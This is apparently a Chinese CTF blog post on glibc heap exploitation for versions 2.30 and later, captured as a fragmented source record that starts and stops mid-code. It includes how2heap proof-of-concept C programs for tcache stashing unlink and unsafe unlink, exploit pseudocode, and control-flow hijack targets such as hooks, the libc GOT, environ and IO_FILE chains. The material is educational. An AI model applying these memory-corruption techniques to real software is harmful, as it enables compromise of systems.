malloc(0xa0);// size > 0x90\n\n    //now 5 tcache bins\n    printf(\"Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\\n\\n\");\n\n    malloc(0x90);\n    malloc(0x90);\n\n    printf(\"Now we emulate a vulnerability that can overwrite the victim->bk pointer into fake_chunk addr: %p.\\n\\n\",(void*)stack_var);\n\n    //change victim->bck\n    /*VULNERABILITY*/\n    chunk_lis[2][1] = (unsigned long)stack_var;\n    /*VULNERABILITY*/\n\n    //trigger the attack\n    printf(\"Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\\n\\n\");\n\n    calloc(1,0x90);\n\n    printf(\"Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck->fd has been changed into a libc addr: %p\\n\\n\",(void*)stack_var[2],(void*)stack_var[4]);\n\n    //malloc and return our fake chunk on stack\n    target = malloc(0x90);   \n\n    printf(\"As you can see, next malloc(0x90) will return the region our fake chunk: %p\\n\",(void*)target);\n\n    assert(target == &stack_var[2]);\n    return 0;\n}\n\n```\n\n\n**核心思路:**\n```python\ncalloc(0xa0)\nfor i in range(6):\n    calloc(0xa0)\n    free(i)\ncalloc(0x4b0) # 9 \ncalloc(0xb0) # 10\nfree(9)\ncalloc(0x400)\n\ncalloc(0x4b0) # 11\ncalloc(0xb0) # 12\nfree(9)\ncalloc(0x400) #13\nedit(13, b'\\x00'*0x400+p64(prev_size)+p64(size)+p64(target_add-0x10))\ncalloc(0xa0)\n```\n\n\n**限制:**\n- 需要UAF\n- 主要适用于只有calloc并且可以分配tcache大小的chunk的情况，对于有malloc，打tcache poison更加方便\n\n**效果:**\n- 获得任意地址target_addr的控制权：在上述流程中，直接将chunk_A的bk改为target_addr - 0x10，并且保证target_addr - 0x10的bk的fd为一个可写地址（一般情况下，使target_addr - 0x10的bk，即target_addr + 8处的值为一个可写地址即可）。\n- 在任意地址target_addr写入大数值：在unsorted bin attack后，有时候要修复链表，在链表不好修复时，可以采用此利用达到同样的效果，在高版本glibc下，unsorted bin attack失效后，此利用应用更为广泛。在上述流程中，需要使tcache bin中原先有六个堆块，然后将chunk_A的bk改为target_addr - 0x10即可。  \n\n\n\n## tcache poison \n主要是通过改写tcache的next指针，实现类似于fastbin的house of spirit的效果。\n\n## house of origin\nhouse of origin 原利用链中的IO_FILE相关利用已经失效了，这里主要关注其绕过无free函数限制的方法，即通过malloc大于top chunk大小的chunk时会先释放top chunk，再拓展堆区域。\n\n一般而言，修改top chunk需要满足一下条件。\n\n1. 伪造的 size 必须要对齐到内存页\n2. size 要大于 MINSIZE(0x10)\n3. size 要小于之后申请的 chunk size + MINSIZE(0x10)\n4. size 的 prev inuse 位必须为 1\n\n\n# 攻击面\n- 劫持控制流\n\t- hooks \n\t- stack \n\t- IO_FILE \n\t- dlts\n\t- libc.got\n- 辅助攻击链\n\t- tcache_perthread_struct \n\t- global_max_fast \n\t- heap 管理结构\n\n\n## 劫持控制流\n### hooks\n堆利用中最基本的夺取控制流的方法就是打各种hooks。\n一般而言，可以利用__free_hook 加 写入'/bin/sh'的堆快实现劫持。\n\n此外，如果要打one_gadget的话，可以打__malloc_hook，在tcache之前的版本，更多是打__malloc_hook，因为其在main_arena附近，存在许多libc上地址，方便通过错位构造0x7f的size，此外，由于__malloc_hook和__realloc_hook临近，也可以很方便地同时控制这两个hook，然后通过__realloc_hook配合来调整栈帧，方便满足one gadget 条件\n\n而在glibc2.34版本及以上，各类hooks都已经被移除，因此也需要掌握一些其他的劫持控制流的办法。\n\n### stack \n在stack overflow 中，通过栈和ROP劫持控制流的方法我们已经不陌生，然而不像stack overflow 天然可以在栈上写入，如果要在heap exploation中通过ROP来劫持控制流，一个无法绕过的问题是栈地址不可知。\n\n我们都知道程序加载时，环境变量会被压入栈中，可以通过environ指针访问到栈上环境变量。\n\n查看glibc源代码\n```c\n#if !_LIBC\n# define __environ\tenviron\n# ifndef HAVE_ENVIRON_DECL\nextern char **environ;\n# endif\n#endif\n```\n发现这是一个extern变量，在gdb中调试查找\n\n```c\n    0x7f78a14d4000     0x7f78a1500000 r--p    2c000      0 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6\n    0x7f78a1500000     0x7f78a1668000 r-xp   168000  2c000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6\n    0x7f78a1668000     0x7f78a16bd000 r--p    55000 194000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6\n    0x7f78a16bd000     0x7f78a16be000 ---p     1000 1e9000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6\n    0x7f78a16be000     0x7f78a16c1000 r--p     3000 1e9000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6\n    0x7f78a16c1000     0x7f78a16c4000 rw-p     3000 1ec000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6\n    0x7f78a16c4000     0x7f78a16d3000 rw-p     f000      0 [anon_7f78a16c4]\n    0x7f78a16d3000     0x7f78a16d4000 r--p     1000      0 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/ld.so.2\n    0x7f78a16d4000     0x7f78a16f8000 r-xp    24000   1000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/ld.so.2\n    0x7f78a16f8000     0x7f78a1702000 r--p     a000  25000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/ld.so.2\n    0x7f78a1702000     0x7f78a1704000 r--p     2000  2e000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/ld.so.2\n    0x7f78a1704000     0x7f78a1706000 rw-p     2000  30000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/ld.so.2\n    0x7ffd6bb9e000     0x7ffd6bbc0000 rw-p    22000      0 [stack]\n    0x7ffd6bbd4000     0x7ffd6bbd8000 r--p     4000      0 [vvar]\n    0x7ffd6bbd8000     0x7ffd6bbda000 r-xp     2000      0 [vdso]\n0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]\npwndbg> p environ\n$1 = (char **) 0x7ffd6bbbdfc8\npwndbg> p &environ\n$2 = (char ***) 0x7f78a16c9ec0 <environ>\npwndbg> \n\n```\n\n可以看到其存在于anon_7f78a16c4段，在libc后，与libc存在固定偏移，猜测这一部分内容与ld 过程有关（笔者暂且还没有查证）\n\n既然可以通过访问libc偏移地址leak stack地址，那么此时我们就可以通过这个栈地址分配到栈上来ROP了。\n\n此攻击点的优点是不像IO_FILE的攻击那样，需要触发程序结束时（exit()函数，从main返回，malloc_assert）时清理现场的流程，可以覆盖堆菜单中分配函数或者edit函数的栈来实现攻击。\n\n### libc.got \n\nchecksec libc，会发现其一般开启了Partial RELRO，所以可以考虑写libc的got表\n\n```bash\n$ checksec libc.so.6       \n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n\n```\n\n笔者在实际操作时发现，pwntools的elf.got并不能很好解析libc的got段，可以使用IDA来查看。\n\n以下的got表来自libc2.34\n\n```c\n.got.plt:00000000001ED000 ; Segment type: Pure data\n.got.plt:00000000001ED000 ; Segment permissions: Read/Write\n.got.plt:00000000001ED000 _got_plt        segment qword public 'DATA' use64\n.got.plt:00000000001ED000                 assume cs:_got_plt\n.got.plt:00000000001ED000                 ;org 1ED000h\n.got.plt:00000000001ED000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC\n.got.plt:00000000001ED008 qword_1ED008    dq 0                    ; DATA XREF: sub_2C000↑r\n.got.plt:00000000001ED010 qword_1ED010    dq 0                    ; DATA XREF: sub_2C000+6↑r\n.got.plt:00000000001ED018 off_1ED018      dq offset __strnlen_ifunc\n.got.plt:00000000001ED018                                         ; DATA XREF: j___strnlen_ifunc↑r\n.got.plt:00000000001ED018                                         ; Indirect relocation\n.got.plt:00000000001ED020 off_1ED020      dq offset __rawmemchr_ifunc\n.got.plt:00000000001ED020                                         ; DATA XREF: j___rawmemchr_ifunc↑r\n.got.plt:00000000001ED020                                         ; Indirect relocation\n.got.plt:00000000001ED028 off_1ED028      dq offset __GI___libc_realloc\n.got.plt:00000000001ED028                                         ; DATA XREF: _realloc↑r\n.got.plt:00000000001ED030 off_1ED030      dq offset __strncasecmp_ifunc\n.got.plt:00000000001ED030                                         ; DATA XREF: j___strncasecmp_ifunc↑r\n.got.plt:00000000001ED030                                         ; Indirect relocation\n.got.plt:00000000001ED038 off_1ED038      dq offset _dl_exception_create\n.got.plt:00000000001ED038                                         ; DATA XREF: __dl_exception_create↑r\n.got.plt:00000000001ED040 off_1ED040      dq offset __mempcpy_ifunc\n.got.plt:00000000001ED040                                         ; DATA XREF: j___mempcpy_ifunc↑r\n.got.plt:00000000001ED040                                         ; Indirect relocation\n.got.plt:00000000001ED048 off_1ED048      dq offset __wmemset_ifunc\n.got.plt:00000000001ED048                                         ; DATA XREF: j___wmemset_ifunc↑r\n.got.plt:00000000001ED048                                         ; Indirect relocation\n.got.plt:00000000001ED050 off_1ED050      dq offset __libc_calloc ; DATA XREF: _calloc↑r\n.got.plt:00000000001ED058 off_1ED058      dq offset strspn_ifunc  ; DATA XREF: j_strspn_ifunc↑r\n.got.plt:00000000001ED058                                         ; Indirect relocation\n.got.plt:00000000001ED060 off_1ED060      dq offset memchr_ifunc  ; DATA XREF: j_memchr_ifunc↑r\n.got.plt:00000000001ED060                                         ; Indirect relocation\n.got.plt:00000000001ED068 off_1ED068      dq offset __libc_memmove_ifunc\n.got.plt:00000000001ED068                                         ; DATA XREF: j___libc_memmove_ifunc↑r\n.got.plt:00000000001ED068                                         ; Indirect relocation\n.got.plt:00000000001ED070 off_1ED070      dq offset __wmemchr_ifunc\n.got.plt:00000000001ED070                                         ; DATA XREF: j___wmemchr_ifunc↑r\n.got.plt:00000000001ED070                                         ; Indirect relocation\n.got.plt:00000000001ED078 off_1ED078      dq offset __stpcpy_ifunc\n.got.plt:00000000001ED078                                         ; DATA XREF: j___stpcpy_ifunc↑r\n.got.plt:00000000001ED078                                         ; Indirect relocation\n.got.plt:00000000001ED080 off_1ED080      dq offset __wmemcmp_ifunc\n.got.plt:00000000001ED080                                         ; DATA XREF: j___wmemcmp_ifunc↑r\n.got.plt:00000000001ED080                                         ; Indirect relocation\n.got.plt:00000000001ED088 off_1ED088      dq offset _dl_find_dso_for_object\n.got.plt:00000000001ED088                                         ; DATA XREF: __dl_find_dso_for_object↑r\n.got.plt:00000000001ED090 off_1ED090      dq offset strncpy_ifunc ; DATA XREF: j_strncpy_ifunc↑r\n.got.plt:00000000001ED090                                         ; Indirect relocation\n.got.plt:00000000001ED098 off_1ED098      dq offset strlen_ifunc  ; DATA XREF: j_strlen_ifunc↑r\n.got.plt:00000000001ED098                                         ; Indirect relocation\n.got.plt:00000000001ED0A0 off_1ED0A0      dq offset __strcasecmp_l_ifunc\n.got.plt:00000000001ED0A0                                         ; DATA XREF: j___strcasecmp_l_ifunc↑r\n.got.plt:00000000001ED0A0                                         ; Indirect relocation\n.got.plt:00000000001ED0A8 off_1ED0A8      dq offset strcpy_ifunc  ; DATA XREF: j_strcpy_ifunc↑r\n.got.plt:00000000001ED0A8                                         ; Indirect relocation\n.got.plt:00000000001ED0B0 off_1ED0B0      dq offset __wcschr_ifunc\n.got.plt:00000000001ED0B0                                         ; DATA XREF: j___wcschr_ifunc↑r\n.got.plt:00000000001ED0B0                                         ; Indirect relocation\n.got.plt:00000000001ED0B8 off_1ED0B8      dq offset __strchrnul_ifunc\n.got.plt:00000000001ED0B8                                         ; DATA XREF: j___strchrnul_ifunc↑r\n.got.plt:00000000001ED0B8                                         ; Indirect relocation\n.got.plt:00000000001ED0C0 off_1ED0C0      dq offset __memrchr_ifunc\n.got.plt:00000000001ED0C0                                         ; DATA XREF: j___memrchr_ifunc↑r\n.got.plt:00000000001ED0C0                                         ; Indirect relocation\n.got.plt:00000000001ED0C8 off_1ED0C8      dq offset _dl_deallocate_tls\n.got.plt:00000000001ED0C8                                         ; DATA XREF: __dl_deallocate_tls↑r\n.got.plt:00000000001ED0D0 off_1ED0D0      dq offset __tls_get_addr\n.got.plt:00000000001ED0D0                                         ; DATA XREF: ___tls_get_addr↑r\n.got.plt:00000000001ED0D8 off_1ED0D8      dq offset __wmemset_ifunc\n.got.plt:00000000001ED0D8                                         ; DATA XREF: j___wmemset_ifunc_0↑r\n.got.plt:00000000001ED0D8                                         ; Indirect relocation\n.got.plt:00000000001ED0E0 off_1ED0E0      dq offset memcmp_ifunc  ; DATA XREF: j_memcmp_ifunc↑r\n.got.plt:00000000001ED0E0                                         ; Indirect relocation\n.got.plt:00000000001ED0E8 off_1ED0E8      dq offset __strncasecmp_l_ifunc\n.got.plt:00000000001ED0E8                                         ; DATA XREF: j___strncasecmp_l_ifunc↑r\n.got.plt:00000000001ED0E8                                         ; Indirect relocation\n.got.plt:00000000001ED0F0 off_1ED0F0      dq offset _dl_fatal_printf\n.got.plt:00000000001ED0F0                                         ; DATA XREF: __dl_fatal_printf↑r\n.got.plt:00000000001ED0F8 off_1ED0F8      dq offset strcat_ifunc  ; DATA XREF: j_strcat_ifunc↑r\n.got.plt:00000000001ED0F8                                         ; Indirect relocation\n.got.plt:00000000001ED100 off_1ED100      dq offset __wcscpy_ifunc\n.got.plt:00000000001ED100                                         ; DATA XREF: j___wcscpy_ifunc↑r\n.got.plt:00000000001ED100                                         ; Indirect relocation\n.got.plt:00000000001ED108 off_1ED108      dq offset strcspn_ifunc ; DATA XREF: j_strcspn_ifunc↑r\n.got.plt:00000000001ED108                                         ; Indirect relocation\n.got.plt:00000000001ED110 off_1ED110      dq offset __strcasecmp_ifunc\n.got.plt:00000000001ED110                                         ; DATA XREF: j___strcasecmp_ifunc↑r\n.got.plt:00000000001ED110                                         ; Indirect relocation\n.got.plt:00000000001ED118 off_1ED118      dq offset strncmp_ifunc ; DATA XREF: j_strncmp_ifunc↑r\n.got.plt:00000000001ED118                                         ; Indirect relocation\n.got.plt:00000000001ED120 off_1ED120      dq offset __wmemchr_ifunc\n.got.plt:00000000001ED120                                         ; DATA XREF: j___wmemchr_ifunc_0↑r\n.got.plt:00000000001ED120                                         ; Indirect relocation\n.got.plt:00000000001ED128 off_1ED128      dq offset __stpncpy_ifunc\n.got.plt:00000000001ED128                                         ; DATA XREF: j___stpncpy_ifunc↑r\n.got.plt:00000000001ED128                                         ; Indirect relocation\n.got.plt:00000000001ED130 off_1ED130      dq offset __wcscmp_ifunc\n.got.plt:00000000001ED130                                         ; DATA XREF: j___wcscmp_ifunc↑r\n.got.plt:00000000001ED130                                         ; Indirect relocation\n.got.plt:00000000001ED138 off_1ED138      dq offset __libc_memmove_ifunc\n.got.plt:00000000001ED138                                         ; DATA XREF: j___libc_memmove_ifunc_0↑r\n.got.plt:00000000001ED138                                         ; Indirect relocation\n.got.plt:00000000001ED140 off_1ED140      dq offset strrchr_ifunc ; DATA XREF: j_strrchr_ifunc↑r\n.got.plt:00000000001ED140                                         ; Indirect relocation\n.got.plt:00000000001ED148 off_1ED148      dq offset strchr_ifunc  ; DATA XREF: j_strchr_ifunc↑r\n.got.plt:00000000001ED148                                         ; Indirect relocation\n.got.plt:00000000001ED150 off_1ED150      dq offset __wcschr_ifunc\n.got.plt:00000000001ED150                                         ; DATA XREF: j___wcschr_ifunc_0↑r\n.got.plt:00000000001ED150                                         ; Indirect relocation\n.got.plt:00000000001ED158 off_1ED158      dq offset __new_memcpy_ifunc\n.got.plt:00000000001ED158                                         ; DATA XREF: j___new_memcpy_ifunc↑r\n.got.plt:00000000001ED158                                         ; Indirect relocation\n.got.plt:00000000001ED160 off_1ED160      dq offset _dl_rtld_di_serinfo\n.got.plt:00000000001ED160                                         ; DATA XREF: __dl_rtld_di_serinfo↑r\n.got.plt:00000000001ED168 off_1ED168      dq offset _dl_allocate_tls\n.got.plt:00000000001ED168                                         ; DATA XREF: __dl_allocate_tls↑r\n.got.plt:00000000001ED170 off_1ED170      dq offset __tunable_get_val\n.got.plt:00000000001ED170                                         ; DATA XREF: ___tunable_get_val↑r\n.got.plt:00000000001ED178 off_1ED178      dq offset __wcslen_ifunc\n.got.plt:00000000001ED178                                         ; DATA XREF: j___wcslen_ifunc↑r\n.got.plt:00000000001ED178                                         ; Indirect relocation\n.got.plt:00000000001ED180 off_1ED180      dq offset memset_ifunc  ; DATA XREF: j_memset_ifunc↑r\n.got.plt:00000000001ED180                                         ; Indirect relocation\n.got.plt:00000000001ED188 off_1ED188      dq offset __wcsnlen_ifunc\n.got.plt:00000000001ED188                                         ; DATA XREF: j___wcsnlen_ifunc↑r\n.got.plt:00000000001ED188                                         ; Indirect relocation\n.got.plt:00000000001ED190 off_1ED190      dq offset strcmp_ifunc  ; DATA XREF: j_strcmp_ifunc↑r\n.got.plt:00000000001ED190                                         ; Indirect relocation\n.got.plt:00000000001ED198 off_1ED198      dq offset _dl_allocate_tls_init\n.got.plt:00000000001ED198                                         ; DATA XREF: __dl_allocate_tls_init↑r\n.got.plt:00000000001ED1A0 off_1ED1A0      dq offset __nptl_change_stack_perm\n.got.plt:00000000001ED1A0                                         ; DATA XREF: ___nptl_change_stack_perm↑r\n.got.plt:00000000001ED1A8 off_1ED1A8      dq offset strpbrk_ifunc ; DATA XREF: j_strpbrk_ifunc↑r\n.got.plt:00000000001ED1A8                                         ; Indirect relocation\n.got.plt:00000000001ED1B0 off_1ED1B0      dq offset __strnlen_ifunc\n.got.plt:00000000001ED1B0                                         ; DATA XREF: j___strnlen_ifunc_0↑r\n.got.plt:00000000001ED1B0 _got_plt        ends                    ; Indirect relocation\n```\n\n可以看到got表中包含了很多字符串和内存相关函数，包括strlen等，为什么strlen这种在libc中实现的函数会需要走got表呢？\n\n笔者在glibc2.34的源代码中进行了查找:\n\n```c\n// string/string.h\n/* Return the length of S.  */\nextern size_t strlen (const char *__s)\n     __THROW __attribute_pure__ __nonnull ((1));\n\n```\n\n\n```c\n// /sysdeps/alpha/strlen.S\n// \nENTRY(strlen)\n#ifdef PROF\n\tldgp\tgp, 0(pv)\n\tlda\tAT, _mcount\n\tjsr\tAT, (AT), _mcount\n\t.prologue 1\n#else\n\t.prologue 0\n#endif\n\n\tldq_u   t0, 0(a0)\t# load first quadword (a0 may be misaligned)\n\tlda     t1, -1(zero)\n\tinsqh   t1, a0, t1\n\tandnot  a0, 7, v0\n\tor      t1, t0, t0\n\tnop\t\t\t# dual issue the next two on ev5\n\tcmpbge  zero, t0, t1\t# t1 <- bitmask: bit i == 1 <==> i-th byte == 0\n\tbne     t1, $found\n\n$loop:\tldq     t0, 8(v0)\n\taddq    v0, 8, v0\t# addr += 8\n\tcmpbge  zero, t0, t1\n\tbeq     t1, $loop\n\n$found:\tnegq    t1, t2\t\t# clear all but least set bit\n\tand     t1, t2, t1\n\n\tand     t1, 0xf0, t2\t# binary search for that set bit\n\tand\tt1, 0xcc, t3\n\tand\tt1, 0xaa, t4\n\tcmovne\tt2, 4, t2\n\tcmovne\tt3, 2, t3\n\tcmovne\tt4, 1, t4\n\taddq\tt2, t3, t2\n\taddq\tv0, t4, v0\n\taddq\tv0, t2, v0\n\tnop\t\t\t# dual issue next two on ev4 and ev5\n\n\tsubq    v0, a0, v0\n\tret\n\n\tEND(strlen)\nlibc_hidden_builtin_def (strlen)\n```\n\n发现在strings.h中，strlen是作为extern函数被引入的，然后发现其真正的实现是在其他文件中通过汇编实现的。\n\n笔者猜测对于glibc对于strlen这种常用操作使用汇编编写来加快执行速度，也因此将其变成了extern 变量。\n\n由于不是很了解编译过程的实现，笔者暂时还无法对此给出完美的解释，因此先在此按下不表，等待之后的深入研究。\n\n而在ctf题中，最常劫持的got表也是strlen，因为其会在puts中被调用，很容易被用到。\n\n同时，在house of pig的攻击流程中，可以将malloc@got作为malloc_hook的替代。\n\n其优点在于像hooks一样劫持方便，只需要libc地址加一次任意分配即可，缺点在与其利用存在限制，并不是所有程序都会用到got表中的函数\n\n### IO_FILE \n在高版本的IO_FILE攻击主要是以下几条利用链(实际上大同小异)，基本上都是通过IO_clean_up来劫持控制流\n- house of apple 2/house of cat: `_IO_wide_data`\n\t- 主打一个简单方便\n- house of kiwi: `_IO_file_jumps`\n\t- 缺点在于_IO_file_jumps在一些版本里是不可写的，而且2.36修改了__malloc_assert\n- house of emma: `_IO_cookie_jumps`\n\n### exit()\n- **rtld_global** \n基本上就是house of banana的攻击流程，缺点是ld的加载基址不确定，需要爆破，优点是只需要一次large bin attack即可。\n- **dtor_list**\n通过call_tls_dtors()来劫持控制流，但是需要劫持TCB.pointer_guard\n\n## 辅助攻击\n\n### tcache_perthread_struct\n```c\n/* There is one of these for each thread, which contains the\n   per-thread cache (hence \"tcache_perthread_struct\").  Keeping\n   overall size low is mildly important.  Note that COUNTS and ENTRIES\n   are redundant (we could have just counted the linked list each\n   time), this is for performance reasons.  */\ntypedef struct tcache_perthread_struct\n{\n  uint16_t counts[TCACHE_MAX_BINS]; // 2*0x40 = 0x80\n  tcache_entry *entries[TCACHE_MAX_BINS]; // 8*0x40 = 0x200\n} tcache_perthread_struct;\n// 0x20+0x10*0x40 = 0x420  \n```\n\ntcache_perthread_struct 是tcache的管理机构，也存在于堆中，如果想办法控制此结构体，即可控制tcache任意分配。\n在glibc2.30以下的版本，counts的类型是char，此结构大小是0x250。\n\n一般是作为辅助攻击的方法，可以简化攻击链。\n\n#### example\n[[2021-DownUnder-note]]\n\n### global_max_fast   \n实际上就是house of corrison的利用，类似的，tcache也有类似的利用。使得大chunk被当作tcache处理。\n\n### heap_info \n直接攻击堆管理结构体，可以看看这篇帖子:[house-of-mind](http://phrack.org/issues/66/10.html)\n#TODO \n\n\n\n\n\n\n","source":"_posts/[Pwn]-heap-exploation-up-to-2.31.md","raw":"---\ntitle: heap-exploation-up-to-2.31\ndate: 2023-6-21\ntags: \n- Pwn \n- CTF \ncategories: CTF \ntoc: true \nsidebar: none\n---\n\n\n# Basic Knowledge\n\n\n###### bins:\n\n| unsorted bin  | fast bin  | small bin | large bin |\n| ------------- | --------- | --------- | --------- |\n| NO LIMITATION | 0x20-0x80 | <0x400    | >0x400    |\n\n## libc version\nubuntu-libc version\n- 2.23=\"16.04\"  \n- 2.24=\"17.04\" \n- 2.26=\"17.10\"\n- 2.27=\"18.04\"  \n- 2.28=\"18.10\" \n- 2.29=\"19.04\"\n- 2.30=\"19.10\" \n- 2.31=\"20.04\"\n- 2.32=\"20.10\"\n- 2.33=\"21.04\"\n- 2.34=\"22.04\"\n\n# Overview\n在刚刚入门堆时，笔者是比较苦恼的，笔者在学习一项知识时，习惯性地想先从大局着手来学习。即，先对这个知识内容的整体有一定了解后，再去填充细节内容。然而在笔者开始学习堆利用时，被各种繁杂的版本差异和堆利用弄得头昏脑涨，因此对于堆一直不得其门而入，无法深刻理解多种多样的技巧及其使用时机，也因此不像栈溢出一样，笔者无法快速理出一个直观的脉络，然后安排细化的学习路径。\n\n本文主要**针对glibc2.30及以上**有着tcache的版本。~~因为低于2.27版本的堆笔者根本不会~~\n\n正如关于栈溢出的文章中，笔者根据攻击点将栈溢出分为三种，在这篇文章中，笔者也将拆解heap exploation，完成笔者心目中的一个划分。\n\n在笔者看来，一次堆利用主要分为一下几个步骤：\n- 漏洞的发现\n- 地址的泄露\n- 利用漏洞控制目标地址内容\n- 攻击的对象\n\n因此，本文的主要的编排顺序，也是按照这样几个顺序来实现的。笔者首先将会介绍堆利用过程中的一些基本漏洞，其次，笔者将会介绍如何完成地址泄露，接着，笔者将会讨论一些heap exploation的技术以及这些技术如何控制目标地址，而在可以控制一个目标地址后，最后笔者将讨论如何如何我们可以选取哪些攻击对象，以及他们各自有什么优劣。\n\n笔者写这一篇文章时，去年这个时间差不多是我刚刚开始学习堆利用的时间，经过一年的时间，笔者总算感觉对于堆利用有了一个比较综合性的认知，尽管当前关于heap exploation的blog很多，但是笔者仍然感觉过于零散，因此，在这篇文章中，同笔者关于栈溢出的文章一样，笔者也不会过多的讲述各个技巧的细节--去看这些技巧的提出者大师傅可能讲述地要比我更完善--而着重于贯穿各个技巧的联系， ~~才不是因为笔者懒呢~~ ，目的是提供一个学习路径的图谱和完成一次堆利用时的思考路径。\n\n# 基本漏洞\n**UAF**\n在free时没有清空指针，可以重利用指针。\n在没有`Edit` 的情况下，可以通过 `double free` 进行堆块重叠。\n\n**overflow**\n溢出，可以控制下一个chunk，一般而言，可以方便地转换为堆块重叠，因此，也容易利用\n\n**off-by-one**/**off-by-null**\n这里主要针对2.29-2.31版本, [2.29-2.31版本的off-by-null](https://www.anquanke.com/post/id/236078#h3-4) ，wjh师傅已经讲解的非常详细了，核心就是通过unsorted bin机制残留的指针伪造fd、bk，来进行unlink，最后制造堆重叠。\n\n\n**漏洞的利用**\n上述几个漏洞都可以方便地转换为堆重叠，在此基础上，可以很方便地转换为任意地址写，在small bin的范围内，可以考虑tcache poison，在large bin的范围内，可以考虑large bin attack，在此基础上再对特定的攻击面进行攻击，即可劫持控制流\n考虑:\n- one gadget \n- system(\"/bin/sh\") \n- orw \n\n\n# leak \n一般而言，堆题中的leak主要是针对libc地址，heap地址的leak相对而言较为简单，而libc地址的leak将在 [[#stack]] 攻击面部分详述。\n\n一般而言，heap leak 堆地址主要利用unsorted bin的第一个chunk会存在libc地址来leak。如果存在UAF，可以将一个直接放入unsorted bin，然后show来获得。\n\n也可以释放入unsorted  bin 后再申请回来实现，由于malloc并不会清空chunk内容，因此可以读取到残留的libc的指针。\n\n而在没有show相关输出chunk内容的函数时，考虑通过`_IO_2_1_stdout_` 来leak \n基本原理就是partial overwrite 覆盖unsorted  bin中的libc地址，分配到__IO_2_1_stdout的位置，然后改写来完成leak \n\n\n\n\n# Basic tricks up to 2.30\n在2.30以上的版本，我认为需要掌握的基本技术主要包括:\n- [x] largebin attack \n- [x] tcache stashing unlink attack \n- [x] unsafe unlink \n- [x] tcache poison\n- [x] house of botcake  \n- [x] decrypt safe_unlink \n- [x] house of pig \n- [x] 堆布局\n\n这里结合how to heap源代码分析\n\n## Largebin attack \n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdint.h>\n#include <assert.h>\n\nuint64_t *chunk0_ptr;\n\nint main()\n{\n\tsetbuf(stdout, NULL);\n\tprintf(\"Welcome to unsafe unlink 2.0!\\n\");\n\tprintf(\"Tested in Ubuntu 20.04 64bit.\\n\");\n\tprintf(\"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\\n\");\n\tprintf(\"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\\n\");\n\n\tint malloc_size = 0x420; //we want to be big enough not to use tcache or fastbin\n\tint header_size = 2;\n\n\tprintf(\"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\\n\\n\");\n\n\tchunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0\n\tuint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1\n\tprintf(\"The global chunk0_ptr is at %p, pointing to %p\\n\", &chunk0_ptr, chunk0_ptr);\n\tprintf(\"The victim chunk we are going to corrupt is at %p\\n\\n\", chunk1_ptr);\n\n\tprintf(\"We create a fake chunk inside chunk0.\\n\");\n\tprintf(\"We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\\n\");\n\tchunk0_ptr[1] = chunk0_ptr[-1] - 0x10;\n\tprintf(\"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\\n\");\n\tchunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);\n\tprintf(\"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\\n\");\n\tprintf(\"With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\\n\");\n\tchunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);\n\tprintf(\"Fake chunk fd: %p\\n\",(void*) chunk0_ptr[2]);\n\tprintf(\"Fake chunk bk: %p\\n\\n\",(void*) chunk0_ptr[3]);\n\n\tprintf(\"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\\n\");\n\tuint64_t *chunk1_hdr = chunk1_ptr - header_size;\n\tprintf(\"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\\n\");\n\tprintf(\"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\\n\");\n\tchunk1_hdr[0] = malloc_size;\n\tprintf(\"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\\n\",(void*)chunk1_hdr[0]);\n\tprintf(\"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\\n\\n\");\n\tchunk1_hdr[1] &= ~1;\n\n\tprintf(\"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\\n\");\n\tprintf(\"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\\n\\n\");\n\tfree(chunk1_ptr);\n\n\tprintf(\"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\\n\");\n\tchar 